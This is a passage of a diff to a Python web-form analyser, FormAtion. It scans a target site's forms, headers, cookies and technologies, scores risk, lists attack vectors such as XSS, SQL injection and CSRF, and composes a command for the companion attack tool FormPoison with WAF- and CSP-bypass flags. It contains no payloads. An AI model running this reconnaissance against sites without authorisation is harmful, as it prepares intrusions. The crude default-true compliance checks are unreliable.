+                recommendations.append(f"Form {form_id}: XSS vectors detected ({', '.join(xss_vectors)})")
+                formpoison_flags.extend(['--xss', '--xss-all'])
+                attack_vectors.add('Cross-Site Scripting (XSS)')
             
-            if 'no_csrf_protection' in form['vulnerability_indicators']:
-                recommendations.append(f"Form {form_id}: No CSRF protection - test CSRF attacks (PortSwigger: CSRF)")
-                attack_vectors.append("CSRF Attack")
-            
-            if any('sql_injection' in field['portswigger_risks'] for field in form['text_input_fields']):
-                recommendations.append(f"Form {form_id}: SQL injection potential - test with SQL payloads")
-                formpoison_flags.append("-t SQL")
-                attack_vectors.append("SQL Injection")
-            
-            if any('dom_xss_potential' in vector for vector in form['portswigger_vectors']):
-                recommendations.append(f"Form {form_id}: DOM XSS potential - test mutation XSS")
-                formpoison_flags.append("--mXSS")
-                attack_vectors.append("DOM XSS")
-            
-            if any(field['field_category'] == 'choice' for field in form['non_text_fields']):
-                recommendations.append(f"Form {form_id}: Choice fields detected - test parameter tampering")
-                attack_vectors.append("Parameter Tampering")
+            # SQL Injection
+            if any('sql_injection' in field.get('portswigger_risks', []) for field in form.get('text_input_fields', [])):
+                recommendations.append(f"Form {form_id}: SQL Injection potential detected")
+                formpoison_flags.extend(['-t SQL', '--sqli-blinds'])
+                attack_vectors.add('SQL Injection')
         
+        # Technology-specific recommendations
         tech = self.results['technology_stack']
         
-        # WAF Detection and Bypass Recommendations
-        if any(server in tech.get('web_servers', []) for server in ['Cloudflare', 'AWS CloudFront', 'Azure CDN']):
-            recommendations.append("CDN/WAF detected - use WAF bypass payloads")
-            formpoison_flags.append("--waf-bypass")
-            attack_vectors.append("WAF Bypass")
+        if 'frontend_frameworks' in tech:
+            frontend = tech['frontend_frameworks']
+            recommendations.append(f"Modern frameworks detected ({', '.join(frontend)}) - test framework-specific vulnerabilities")
+            formpoison_flags.extend(['--sanitizer-bypass', '--mXSS'])
+            attack_vectors.add('Framework-Specific Attacks')
         
-        # CSP Bypass Recommendations
-        headers = self.results['security_headers']
-        if headers.get('Content-Security-Policy'):
-            recommendations.append("CSP detected - test CSP bypass techniques")
-            formpoison_flags.append("--csp-bypass")
-            attack_vectors.append("CSP Bypass")
+        if 'cms' in tech:
+            cms_list = tech['cms']
+            recommendations.append(f"CMS detected ({', '.join(cms_list)}) - test CMS-specific vulnerabilities")
+            formpoison_flags.append('--cms-specific')
+        
+        # Security header recommendations
+        headers = self.results.get('security_headers', {})
+        missing_critical = [
+            header for header, info in headers.items() 
+            if info.get('status') == '❌ Missing' and info.get('risk_level') == 'high'
+        ]
+        
+        if missing_critical:
+            recommendations.append(f"Missing critical security headers: {', '.join(missing_critical)}")
+            formpoison_flags.append('--header-testing')
+            attack_vectors.add('Security Header Bypass')
+        
+        # CORS issues
+        if self.results.get('cors_configuration', {}).get('is_weak'):
+            recommendations.append("Weak CORS configuration detected - test CORS bypass")
+            formpoison_flags.append('--cors-bypass')
+            attack_vectors.add('CORS Attack')
+        
+        # Cookie issues
+        cookie_analysis = self.results.get('cookie_analysis', [])
+        insecure_cookies = [c['name'] for c in cookie_analysis if not c.get('is_secure')]
+        if insecure_cookies:
+            recommendations.append(f"Insecure cookies detected: {', '.join(insecure_cookies)}")
+            attack_vectors.add('Session Hijacking')
+        
+        # Advanced flags based on overall risk
+        total_risk_score = sum(f.get('complexity_score', 0) for f in self.results['forms_analysis'])
+        if total_risk_score > 20:
+            formpoison_flags.extend(['--verbose-all', '--deep-scan', '--aggressive'])
+        elif total_risk_score > 10:
+            formpoison_flags.extend(['--verbose', '--standard-scan'])
         else:
-            recommendations.append("No CSP - higher XSS success rate (PortSwigger: CSP Bypass)")
-            attack_vectors.append("CSP Bypass")
+            formpoison_flags.append('--quick-scan')
         
-        # Sanitizer Bypass Recommendations
-        if any(framework in tech.get('frontend_frameworks', []) for framework in ['React', 'Vue.js', 'Angular']):
-            recommendations.append("Modern JS framework - test for sanitizer bypass and mutation XSS")
-            formpoison_flags.extend(["--sanitizer-bypass", "--mXSS"])
-            attack_vectors.extend(["Sanitizer Bypass", "Mutation XSS"])
-        
-        # Encoder Bypass Recommendations
-        if 'WordPress' in tech.get('cms', []) or any(lang in tech.get('programming_languages', []) for lang in ['PHP', 'Python']):
-            recommendations.append("Common CMS/framework - test encoder bypass techniques")
-            formpoison_flags.append("--encoder-bypass")
-            attack_vectors.append("Encoder Bypass")
-        
-        # Encoding Confusion Recommendations
-        if any(form['method'] == 'GET' for form in self.results['forms_analysis']):
-            recommendations.append("GET forms detected - test encoding confusion and parameter pollution")
-            formpoison_flags.extend(["--encoding-confusion", "--method GET"])
-            attack_vectors.extend(["Encoding Confusion", "HTTP Parameter Pollution"])
-        
-        # Size Overflow Recommendations
-        total_text_fields = sum(len(form['text_input_fields']) for form in self.results['forms_analysis'])
-        if total_text_fields > 5:
-            formpoison_flags.append("--brute")
-            recommendations.append(f"Multiple text fields ({total_text_fields}) - use brute force for efficiency")
-        
-        # Size overflow for forms with many fields or large input areas
-        large_forms = [f for f in self.results['forms_analysis'] if len(f['all_fields']) > 10]
-        if large_forms:
-            recommendations.append("Large forms detected - test size overflow attacks")
-            formpoison_flags.append("--size-overflow")
-            attack_vectors.append("Size Overflow")
-        
-        # Additional technology-specific recommendations
-        if 'WordPress' in tech.get('cms', []):
-            recommendations.append("WordPress detected - test WordPress-specific payloads and sanitizer bypasses")
-            formpoison_flags.extend(["--sanitizer-bypass", "--encoder-bypass"])
-            attack_vectors.append("WordPress XSS")
-        
-        if any('ASP.NET' in framework for framework in tech.get('backend_frameworks', [])):
-            recommendations.append("ASP.NET detected - test ViewState and encoder bypasses")
-            formpoison_flags.extend(["--encoder-bypass", "--encoding-confusion"])
-            attack_vectors.append("ASP.NET Bypass")
-        
-        # Headers analysis for additional bypass recommendations
-        if not headers.get('X-Frame-Options'):
-            recommendations.append("No X-Frame-Options - clickjacking possible (PortSwigger: Clickjacking)")
-            attack_vectors.append("Clickjacking")
-        
-        if not headers.get('Strict-Transport-Security'):
-            recommendations.append("No HSTS - SSL stripping possible")
-            attack_vectors.append("SSL Stripping")
-        
-        # Verbosity based on complexity
-        high_risk_forms = sum(1 for f in self.results['forms_analysis'] if f['complexity_score'] >= 5)
-        if high_risk_forms > 0 or total_text_fields > 10:
-            formpoison_flags.append("--verbose-all")
-            recommendations.append("High risk forms detected - use --verbose-all for detailed response analysis")
-        else:
-            formpoison_flags.append("--verbose")
-            recommendations.append("Use --verbose for basic progress information")
-        
-        # Remove duplicate flags while preserving order
+        # Deduplicate flags while preserving order
         seen = set()
         unique_flags = []
         for flag in formpoison_flags:
@@ -812,258 +1305,364 @@ class FormAtionAnalyzer:
         
         self.results['recommendations'] = recommendations
         self.results['formpoison_flags'] = unique_flags
-        self.results['attack_vectors'] = list(set(attack_vectors))
+        self.results['attack_vectors'] = list(attack_vectors)
     
-    def visualize_form_structure(self, form_analysis):
-        form_id = form_analysis['form_id']
-        action = form_analysis['action'] or 'self'
-        method = form_analysis['method']
+    def _generate_compliance_report(self) -> None:
+        """Generate compliance report based on findings."""
+        compliance = {
+            'owasp_top_10': self._check_owasp_compliance(),
+            'pci_dss': self._check_pci_compliance(),
+            'gdpr': self._check_gdpr_compliance(),
+            'hipaa': self._check_hipaa_compliance()
+        }
         
-        console.print(f"\n[bold cyan] FORM {form_id} VISUALIZATION[/bold cyan]")
-        console.print(f"[bold white]Method: {method} | Action: {action}[/bold white]")
-        
-        form_viz = []
-        
-        for field in form_analysis['all_fields']:
-            field_name = field['name'] or field['id'] or 'unnamed'
-            field_type = field['type']
-            element_type = field['element_type']
-            threat_level = field['threat_level']
-
-            if element_type == 'input':
-                if field_type == 'text':
-                    icon = "📝"
-                elif field_type == 'password':
-                    icon = "🔒"
-                elif field_type == 'email':
-                    icon = "📧"
-                elif field_type == 'file':
-                    icon = "📁"
-                elif field_type == 'hidden':
-                    icon = "👻"
-                elif field_type in ['checkbox', 'radio']:
-                    icon = "☑️"
-                elif field_type == 'submit':
-                    icon = "🚀"
-                else:
-                    icon = "⚙️"
-            elif element_type == 'textarea':
-                icon = "📄"
-            elif element_type == 'select':
-                icon = "🔽"
-            elif element_type == 'button':
-                icon = "🔘"
-            else:
-                icon = "❓"
-
-            threat_color = {
-                'high': 'red',
-                'medium': 'yellow', 
-                'low': 'green'
-            }[threat_level]
-
-            threats = []
-            if field['portswigger_risks']:
-                threats.extend(field['portswigger_risks'])
-            if field['suspicious_patterns']:
-                threats.extend(field['suspicious_patterns'])
-            
-            threats_text = ", ".join(threats) if threats else "No specific threats"
-            line = f"{icon} [bold white]{field_name}[/bold white] ([dim]{field_type}[/dim])"
-            line += f" - Threat: [bold {threat_color}]{threat_level.upper()}[/bold {threat_color}]"
-            line += f" - {threats_text}"
-            
-            form_viz.append(line)
-        
-        for line in form_viz:
-            console.print(f"  {line}")
-        
-        high_threats = sum(1 for field in form_analysis['all_fields'] if field['threat_level'] == 'high')
-        medium_threats = sum(1 for field in form_analysis['all_fields'] if field['threat_level'] == 'medium')
-        
-        if high_threats > 0 or medium_threats > 0:
-            console.print(f"\n[bold red]⚠️  FORM {form_id} THREAT SUMMARY:[/bold red]")
-            console.print(f"  [red]• High threats: {high_threats}[/red]")
-            console.print(f"  [yellow]• Medium threats: {medium_threats}[/yellow]")
-            
-            if form_analysis['portswigger_vectors']:
-                console.print(f"  [cyan]• Attack vectors: {', '.join(form_analysis['portswigger_vectors'])}[/cyan]")
+        self.results['compliance_report'] = compliance
     
-    def display_report(self):
-        console.print(Panel.fit("📊 [bold green]FormAtion Analysis Report[/bold green]", border_style="green"))
+    def _check_owasp_compliance(self) -> Dict:
+        """Check OWASP Top 10 compliance."""
+        owasp_checks = {
+            'A1:2021-Broken Access Control': True,
+            'A2:2021-Cryptographic Failures': True,
+            'A3:2021-Injection': True,
+            'A4:2021-Insecure Design': True,
+            'A5:2021-Security Misconfiguration': True,
+            'A6:2021-Vulnerable Components': True,
+            'A7:2021-Auth Failures': True,
+            'A8:2021-Software Integrity': True,
+            'A9:2021-Logging Failures': True,
+            'A10:2021-SSRF': True
+        }
         
-        total_text_fields = sum(len(form['text_input_fields']) for form in self.results['forms_analysis'])
-        total_non_text_fields = sum(len(form['non_text_fields']) for form in self.results['forms_analysis'])
+        # Check for actual issues
+        if any('sql_injection' in str(form) for form in self.results['forms_analysis']):
+            owasp_checks['A3:2021-Injection'] = False
         
-        summary_table = Table(show_header=True, header_style="bold magenta", box=box.ROUNDED)
-        summary_table.add_column("Metric", style="cyan", width=20)
-        summary_table.add_column("Value", style="white", width=15)
+        security_headers = self.results.get('security_headers', {})
+        if any(info.get('status') == '❌ Missing' for info in security_headers.values()):
+            owasp_checks['A5:2021-Security Misconfiguration'] = False
         
-        summary_table.add_row("URL", self.results['url'])
-        summary_table.add_row("Forms Found", str(len(self.results['forms_analysis'])))
-        summary_table.add_row("Text Input Fields", str(total_text_fields))
-        summary_table.add_row("Non-Text Fields", str(total_non_text_fields))
-        summary_table.add_row("Response Code", str(self.results.get('response_code', 'N/A')))
-        summary_table.add_row("High Risk Forms", 
-                             str(sum(1 for f in self.results['forms_analysis'] if f['complexity_score'] >= 5)))
-        summary_table.add_row("Server", self.results.get('server', 'N/A'))
+        if any('login_form' in str(form) for form in self.results['forms_analysis']):
+            owasp_checks['A7:2021-Auth Failures'] = False
         
-        console.print(summary_table)
+        return {
+            'compliant': all(owasp_checks.values()),
+            'checks': owasp_checks
+        }
+    
+    def _check_pci_compliance(self) -> Dict:
+        """Check PCI DSS compliance requirements."""
+        pci_checks = {
+            '6.5.1-Injection flaws': True,
+            '6.5.2-Buffer overflows': True,
+            '6.5.3-Insecure cryptographic storage': True,
+            '6.5.4-Insecure communications': True,
+            '6.5.5-Improper error handling': True,
+            '6.5.6-XSS': True,
+            '6.5.7-Improper access control': True,
+            '6.5.8-CSRF': True,
+            '6.5.9-Broken authentication': True
+        }
         
+        # Check for actual issues
+        forms_analysis = self.results['forms_analysis']
+        if any('sql_injection' in str(form) for form in forms_analysis):
+            pci_checks['6.5.1-Injection flaws'] = False
+        
+        if any('xss' in str(form).lower() for form in forms_analysis):
+            pci_checks['6.5.6-XSS'] = False
+        
+        if any('csrf' in str(form).lower() for form in forms_analysis):
+            pci_checks['6.5.8-CSRF'] = False
+        
+        return {
+            'compliant': all(pci_checks.values()),
+            'checks': pci_checks
+        }
+    
+    def _check_gdpr_compliance(self) -> Dict:
+        """Check GDPR compliance requirements."""
+        gdpr_checks = {
+            'Data encryption in transit': self.response_headers.get('strict-transport-security') is not None,
+            'Secure cookie handling': all(c.get('is_secure', False) for c in self.results.get('cookie_analysis', [])),
+            'Data minimization': True,
+            'User consent mechanisms': True
+        }
+        
+        return {
+            'compliant': all(gdpr_checks.values()),
+            'checks': gdpr_checks
+        }
+    
+    def _check_hipaa_compliance(self) -> Dict:
+        """Check HIPAA compliance requirements."""
+        hipaa_checks = {
+            'Encryption at rest': True,
+            'Encryption in transit': self.response_headers.get('strict-transport-security') is not None,
+            'Access controls': True,
+            'Audit logging': True
+        }
+        
+        return {
+            'compliant': all(hipaa_checks.values()),
+            'checks': hipaa_checks
+        }
+    
+    def _create_risk_assessment(self) -> None:
+        """Create overall risk assessment."""
+        total_forms = len(self.results['forms_analysis'])
+        high_risk_forms = sum(1 for f in self.results['forms_analysis'] if f['complexity_score'] >= 7)
+        critical_forms = sum(1 for f in self.results['forms_analysis'] if f['complexity_score'] >= 10)
+        
+        # Calculate risk score (0-100)
+        risk_score = 0
+        risk_score += len(self.results.get('attack_vectors', [])) * 5
+        risk_score += high_risk_forms * 10
+        risk_score += critical_forms * 15
+        
+        missing_critical_headers = sum(
+            1 for info in self.results.get('security_headers', {}).values() 
+            if info.get('status') == '❌ Missing' and info.get('risk_level') == 'high'
+        )
+        risk_score += missing_critical_headers * 8
+        
+        risk_score = min(risk_score, 100)
+        
+        if risk_score >= 75:
+            risk_level = 'CRITICAL'
+            color = 'red'
+        elif risk_score >= 50:
+            risk_level = 'HIGH'
+            color = 'orange'
+        elif risk_score >= 25:
+            risk_level = 'MEDIUM'
+            color = 'yellow'
+        else:
+            risk_level = 'LOW'
+            color = 'green'
+        
+        self.results['risk_assessment'] = {
+            'risk_score': risk_score,
+            'risk_level': risk_level,
+            'color': color,
+            'critical_forms': critical_forms,
+            'high_risk_forms': high_risk_forms,
+            'total_forms': total_forms,
+            'missing_critical_headers': missing_critical_headers,
+            'attack_vectors_count': len(self.results.get('attack_vectors', []))
+        }
+    
+    def _build_remediation_plan(self) -> None:
+        """Build detailed remediation plan."""
+        remediation = []
+        
+        # Forms remediation
         for form in self.results['forms_analysis']:
-            if form['text_input_fields']:
+            form_id = form['form_id']
+            
+            if form['method'] == 'GET' and form.get('text_input_fields'):
+                remediation.append({
+                    'priority': 'HIGH',
+                    'form_id': form_id,
+                    'issue': 'Sensitive data in GET request',
+                    'action': f'Change Form {form_id} method to POST for sensitive data',
+                    'effort': 'Low'
+                })
+            
+            has_csrf = any('csrf' in f.get('name', '').lower() for f in form.get('all_fields', []))
+            if not has_csrf and form['method'] != 'GET':
+                remediation.append({
+                    'priority': 'HIGH',
+                    'form_id': form_id,
+                    'issue': 'Missing CSRF protection',
+                    'action': f'Implement CSRF tokens in Form {form_id}',
+                    'effort': 'Medium'
+                })
+        
+        # Headers remediation
+        for header, info in self.results.get('security_headers', {}).items():
+            if info.get('status') == '❌ Missing':
+                remediation.append({
+                    'priority': info.get('risk_level', 'low').upper(),
+                    'issue': f'Missing {header}',
+                    'action': info.get('recommendation', f'Implement {header}'),
+                    'effort': 'Low'
+                })
+        
+        self.results['remediation_plan'] = remediation
+    
+    def _display_comprehensive_report(self) -> None:
+        """Display comprehensive analysis report."""
+        
+        # Executive Summary
+        risk = self.results.get('risk_assessment', {})
+        console.print(Panel.fit(
+            f"[bold]EXECUTIVE SUMMARY[/bold]\n\n"
+            f"Target: {self.results['url']}\n"
+            f"Risk Level: [bold {risk.get('color', 'white')}]{risk.get('risk_level', 'UNKNOWN')}[/bold {risk.get('color', 'white')}]\n"
+            f"Risk Score: {risk.get('risk_score', 0)}/100\n"
+            f"Forms Analyzed: {risk.get('total_forms', 0)}\n"
+            f"Critical Forms: {risk.get('critical_forms', 0)}\n"
+            f"Attack Vectors: {risk.get('attack_vectors_count', 0)}",
+            title="📊 FormAtion Analysis Report",
+            border_style=risk.get('color', 'white')
+        ))
+        
+        # Forms Analysis
+        if self.results['forms_analysis']:
+            console.print("\n[bold cyan]📋 FORM ANALYSIS[/bold cyan]")
+            
+            for form in self.results['forms_analysis']:
+                form_id = form['form_id']
+                score = form['complexity_score']
+                
+                # Risk color
+                if score >= 10:
+                    risk_color = 'red'
+                    risk_level = 'CRITICAL'
+                elif score >= 7:
+                    risk_color = 'orange1'
+                    risk_level = 'HIGH'
+                elif score >= 4:
+                    risk_color = 'yellow'
+                    risk_level = 'MEDIUM'
+                else:
+                    risk_color = 'green'
+                    risk_level = 'LOW'
+                
                 form_table = Table(
-                    title=f"📝 Form {form['form_id']} - TEXT INPUT FIELDS ({form['method']} {form['action'] or 'self'})",
-                    show_header=True, 
-                    header_style="bold yellow",
+                    title=f"Form {form_id} - {risk_level} RISK (Score: {score})",
+                    header_style=f"bold {risk_color}",
                     box=box.ROUNDED
                 )
-                form_table.add_column("Field Name", style="cyan", width=20)
-                form_table.add_column("Type", style="white", width=12)
-                form_table.add_column("Category", style="green", width=15)
-                form_table.add_column("Risk Indicators", style="red", width=25)
-                form_table.add_column("PortSwigger Risks", style="magenta", width=25)
                 
-                for field in form['text_input_fields']:
-                    risk_indicators = ", ".join(field['suspicious_patterns'])
-                    portswigger_risks = ", ".join(field['portswigger_risks'])
-                    
+                form_table.add_column("Field", style="cyan")
+                form_table.add_column("Type", style="white")
+                form_table.add_column("Category", style="green")
+                form_table.add_column("Risks", style="red")
+                
+                for field in form.get('text_input_fields', []):
+                    risks = ', '.join(field.get('portswigger_risks', [])[:3])
                     form_table.add_row(
-                        field['name'] or field['id'] or 'N/A',
-                        field['type'],
-                        field['field_category'],
-                        risk_indicators if risk_indicators else "None",
-                        portswigger_risks if portswigger_risks else "None"
+                        field.get('name', 'N/A'),
+                        field.get('field_type', 'text'),
+                        field.get('field_category', 'other'),
+                        risks if risks else 'None'
                     )
                 
                 console.print(form_table)
+                
+                if form.get('portswigger_vectors'):
+                    console.print(f"[bold cyan]Attack Vectors:[/bold cyan] {', '.join(form['portswigger_vectors'][:5])}")
+        
+        # Security Headers
+        if self.results['security_headers']:
+            console.print("\n[bold cyan]🛡️ SECURITY HEADERS[/bold cyan]")
             
-            if form['non_text_fields']:
-                non_text_table = Table(
-                    title=f"Form {form['form_id']} - NON-TEXT FIELDS",
-                    show_header=True, 
-                    header_style="bold blue",
-                    box=box.ROUNDED
+            headers_table = Table(
+                title="Security Headers Analysis",
+                header_style="bold blue",
+                box=box.ROUNDED
+            )
+            
+            headers_table.add_column("Header", style="cyan")
+            headers_table.add_column("Status", style="white")
+            headers_table.add_column("Risk", style="red")
+            
+            for header, info in self.results['security_headers'].items():
+                status_style = 'green' if info.get('is_compliant') else 'red'
+                headers_table.add_row(
+                    header,
+                    f"[{status_style}]{info['status']}[/{status_style}]",
+                    info.get('risk_level', 'unknown').upper()
                 )
-                non_text_table.add_column("Field Name", style="cyan", width=20)
-                non_text_table.add_column("Element", style="white", width=12)
-                non_text_table.add_column("Type", style="green", width=15)
-                non_text_table.add_column("Category", style="yellow", width=15)
-                
-                for field in form['non_text_fields']:
-                    non_text_table.add_row(
-                        field['name'] or field['id'] or 'N/A',
-                        field['element_type'],
-                        field['type'],
-                        field['field_category']
-                    )
-                
-                console.print(non_text_table)
-
-            risk_level = "High" if form['complexity_score'] >= 5 else "Medium" if form['complexity_score'] >= 3 else "Low"
-            risk_color = 'red' if risk_level == 'High' else 'yellow' if risk_level == 'Medium' else 'green'
             
-            console.print(f"🔒 [bold {risk_color}]Form Risk Level: {risk_level} (Score: {form['complexity_score']})[/]")
-            
-            if form['portswigger_vectors']:
-                vectors_text = ", ".join(form['portswigger_vectors'])
-                console.print(f" [bold cyan]PortSwigger Vectors:[/bold cyan] {vectors_text}")
+            console.print(headers_table)
         
-        console.print(Panel.fit(" [bold cyan]FORM VISUALIZATION WITH THREATS[/bold cyan]", border_style="cyan"))
-        for form in self.results['forms_analysis']:
-            self.visualize_form_structure(form)
-        
+        # Technology Stack
         if self.results['technology_stack']:
-            console.print(Panel.fit("🔧 [bold blue]Technology Stack Analysis[/bold blue]", border_style="blue"))
+            console.print("\n[bold cyan]🔧 TECHNOLOGY STACK[/bold cyan]")
             
+            tech_tree = Tree("Detected Technologies")
             for category, technologies in self.results['technology_stack'].items():
                 if technologies:
-                    tech_table = Table(title=f"{category.replace('_', ' ').title()}", 
-                                     show_header=True, header_style="bold cyan", box=box.ROUNDED)
-                    tech_table.add_column("Technology", style="white")
-                    tech_table.add_column("Confidence", style="green")
-                    
+                    category_node = tech_tree.add(f"[bold]{category.replace('_', ' ').title()}[/bold]")
                     for tech in technologies:
-                        confidence = "High" if any(source in category for source in ['backend', 'cms', 'server']) else "Medium"
-                        tech_table.add_row(tech, confidence)
-                    
-                    console.print(tech_table)
+                        category_node.add(f"[green]{tech}[/green]")
+            
+            console.print(tech_tree)
         
+        # Recommendations and Command
         if self.results['formpoison_flags']:
             command = f"python formpoison.py {self.url} {' '.join(self.results['formpoison_flags'])}"
             console.print(Panel.fit(
-                f"🎯 [bold cyan]Recommended FormPoison Command[/bold cyan]\n\n[bold white]{command}[/bold white]",
+                f"🎯 [bold cyan]Recommended FormPoison Command[/bold cyan]\n\n"
+                f"[white]{command}[/white]",
                 border_style="cyan",
-                box=box.DOUBLE
+                title="Execute"
             ))
         
-        if self.results['recommendations']:
-            console.print("\n[bold yellow]📝 PortSwigger-Based Recommendations:[/bold yellow]")
-            for rec in self.results['recommendations']:
-                console.print(f"  • {rec}")
-        
+        # Attack Vectors
         if self.results['attack_vectors']:
-            console.print("\n[bold red]⚡ Identified Attack Vectors:[/bold red]")
+            console.print("\n[bold red]⚡ IDENTIFIED ATTACK VECTORS[/bold red]")
             for vector in self.results['attack_vectors']:
-                console.print(f"  • {vector}")
+                console.print(f"  • [yellow]{vector}[/yellow]")
         
-        sec_table = Table(title="Security Headers Analysis", show_header=True, header_style="bold red", box=box.ROUNDED)
-        sec_table.add_column("Header", style="cyan", width=25)
-        sec_table.add_column("Status", style="white", width=15)
-        sec_table.add_column("Risk", style="red", width=20)
-        
-        headers = self.results['security_headers']
-        security_headers_info = {
-            'Content-Security-Policy': ('High', 'XSS Protection'),
-            'X-Frame-Options': ('Medium', 'Clickjacking Protection'),
-            'Strict-Transport-Security': ('High', 'SSL Enforcement'),
-            'X-XSS-Protection': ('Medium', 'XSS Filter'),
-            'X-Content-Type-Options': ('Low', 'MIME Sniffing'),
-            'Referrer-Policy': ('Low', 'Referrer Control'),
-            'Permissions-Policy': ('Medium', 'Feature Control')
-        }
-        
-        for header, value in headers.items():
-            status = "✅ Present" if value else "❌ Missing"
-            risk_level, description = security_headers_info.get(header, ('Unknown', ''))
-            sec_table.add_row(header, status, f"{risk_level} - {description}")
-        
-        console.print(sec_table)
+        # Compliance Summary
+        compliance = self.results.get('compliance_report', {})
+        if compliance:
+            console.print("\n[bold green]📜 COMPLIANCE STATUS[/bold green]")
+            
+            for standard, report in compliance.items():
+                status = "[green]✅ Compliant[/green]" if report['compliant'] else "[red]❌ Non-Compliant[/red]"
+                console.print(f"  {standard.upper()}: {status}")
 
 async def main():
-    parser = argparse.ArgumentParser(description="FormAtion - Advanced Web Form Analyzer")
-    parser.add_argument("url", help="URL to analyze")
+    """Main entry point with enhanced argument parsing."""
+    parser = argparse.ArgumentParser(
+        description="FormAtion - Advanced Web Form Analyzer for FormPoison",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  %(prog)s https://example.com
+  %(prog)s https://example.com --output results.json
+  %(prog)s https://example.com --user-agent "Custom/1.0" --proxy http://proxy:8080
+        """
+    )
+    
+    parser.add_argument("url", help="Target URL to analyze")
     parser.add_argument("--user-agent", help="Custom User-Agent string")
-    parser.add_argument("--proxy", help="Proxy URL")
-    parser.add_argument("--output", help="Save results to JSON file")
+    parser.add_argument("--proxy", help="Proxy URL (e.g., http://proxy:8080)")
+    parser.add_argument("--output", "-o", help="Save results to JSON file")
+    parser.add_argument("--timeout", type=int, default=30, help="Request timeout in seconds")
+    parser.add_argument("--no-ssl-verify", action="store_true", help="Disable SSL verification")
+    parser.add_argument("--max-redirects", type=int, default=5, help="Maximum redirects to follow")
+    parser.add_argument("--version", action="version", version=f"FormAtion {FormAtionAnalyzer.VERSION}")
     
     args = parser.parse_args()
     
-    banner_text = Text()
-    banner_text.append("╔═══════════════════════════════════════╗\n", style="cyan")
-    banner_text.append("║            ", style="cyan")
-    banner_text.append("FormAtion", style="bold cyan")
-    banner_text.append(" v1.0             ║\n", style="cyan")
-    banner_text.append("║    ", style="cyan")
-    banner_text.append("Advanced Web Form Analyzer", style="bold yellow")
-    banner_text.append("         ║\n", style="cyan")
-    banner_text.append("║      ", style="cyan")
-    banner_text.append("Pre-scout for FormPoison", style="bold white")
-    banner_text.append("         ║\n", style="cyan")
-    banner_text.append("║       ", style="cyan")
-    banner_text.append("PortSwigger Methodology", style="bold red")
-    banner_text.append("         ║\n", style="cyan")
-    banner_text.append("╚═══════════════════════════════════════╝", style="cyan")
+    # Display banner
+    console.print(Panel.fit(
+        "[bold cyan]FormAtion[/bold cyan] [bold white]v" + FormAtionAnalyzer.VERSION + "[/bold white]\n"
+        "[dim]Advanced Web Form Analyzer - Pre-scout for FormPoison[/dim]\n"
+        "[dim]PortSwigger Research Methodology[/dim]",
+        border_style="cyan"
+    ))
     
-    console.print(Panel.fit(banner_text, border_style="cyan"))
+    async with FormAtionAnalyzer(
+        url=args.url,
+        user_agent=args.user_agent,
+        proxies=args.proxy,
+        timeout=args.timeout,
+        max_redirects=args.max_redirects,
+        verify_ssl=not args.no_ssl_verify
+    ) as analyzer:
+        results = await analyzer.analyze_site()
     
-    analyzer = FormAtionAnalyzer(args.url, args.user_agent, args.proxy)
-    results = await analyzer.analyze_site()
-   
+    # Save results if requested
     if args.output:
         with open(args.output, 'w') as f:
-            json.dump(results, f, indent=2)
-        console.print(f"\n[bold green]Results saved to: {args.output}[/bold green]")
+            json.dump(results, f, indent=2, default=str)
+        console.print(f"\n[bold green]✅ Results saved to: {args.output}[/bold green]")
 
 if __name__ == "__main__":
     asyncio.run(main())
